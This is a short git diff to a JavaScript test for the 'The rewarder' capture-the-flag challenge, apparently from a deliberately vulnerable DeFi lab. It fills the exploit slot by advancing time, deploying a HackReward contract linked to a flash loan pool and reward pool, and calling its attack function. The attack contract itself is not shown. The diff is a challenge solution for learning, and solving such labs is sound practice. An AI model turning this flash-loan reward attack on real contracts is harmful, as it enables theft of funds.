@@ -61,6 +61,20 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+
+        await time.increase(time.duration.days(5));
+
+        const hack = await HackReward.new(
+          this.flashLoanPool.address,
+          this.liquidityToken.address,
+          this.rewarderPool.address,
+          this.rewardToken.address,
+          {
+            from: deployer,
+          }
+        );
+    
+        await hack.attack({ from: attacker });
     });
 
     after(async function () {
